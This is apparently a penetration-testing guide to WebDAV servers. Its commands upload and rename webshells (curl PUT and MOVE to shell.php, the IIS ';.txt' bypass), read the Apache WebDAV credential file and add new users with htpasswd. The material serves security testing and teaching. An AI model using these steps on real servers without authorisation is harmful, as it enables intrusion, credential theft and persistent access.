When dealing with a **HTTP Server with WebDav** enabled, it's possible to **manipulate files** if you have the right **credentials**, usually verified through **HTTP Basic Authentication**. Gaining control over such a server often involves the **upload and execution of a webshell**.

Access to the WebDav server typically requires **valid credentials**, with [**WebDav bruteforce**](../../generic-hacking/brute-force.md#http-basic-auth) being a common method to acquire them.

To overcome restrictions on file uploads, especially those preventing the execution of server-side scripts, you might:

- **Upload** files with **executable extensions** directly if not restricted.
- **Rename** uploaded non-executable files (like .txt) to an executable extension.
- **Copy** uploaded non-executable files, changing their extension to one that is executable.

## DavTest

**Davtest** try to **upload several files with different extensions** and **check** if the extension is **executed**:

```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```

Output sample:

This doesn't mean that **.txt** and **.html extensions are being executed**. This mean that you can **access this files** through the web.

## Cadaver

You can use this tool to **connect to the WebDav** server and perform actions (like **upload**, **move** or **delete**) **manually**.

```
cadaver <IP>
```

## PUT request

```
curl -T 'shell.txt' 'http://$ip'
```

## MOVE request

```bash
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```

## IIS5/6 WebDav Vulnerability

This vulnerability is very interesting. The **WebDav** does **not allow** to **upload** or **rename** files with the extension **.asp**. But you can **bypass** this **adding** at the end of the name **";.txt"** and the file will be **executed** as if it were a .asp file (you could also **use ".html" instead of ".txt"** but **DON'T forget the ";"**).

Then you can **upload** your shell as a ".**txt" file** and **copy/move it to a ".asp;.txt"** file. An accessing that file through the web server, it will be **executed** (cadaver will said that the move action didn't work, but it did).

## Post credentials

If the Webdav was using an Apache server you should look at configured sites in Apache. Commonly:\
_**/etc/apache2/sites-enabled/000-default**_

Inside it you could find something like:

```
ServerAdmin webmaster@localhost
        Alias /webdav /var/www/webdav
        <Directory /var/www/webdav>
                DAV On
                AuthType Digest
                AuthName "webdav"
                AuthUserFile /etc/apache2/users.password
                Require valid-user
```

As you can see there is the files with the valid **credentials** for the **webdav** server:

```
/etc/apache2/users.password
```

Inside this type of files you will find the **username** and a **hash** of the password. These are the credentials the webdav server is using to authenticate users.

You can try to **crack** them, or to **add more** if for some reason you wan to **access** the **webdav** server:

```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```

To check if the new credentials are working you can do:

```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
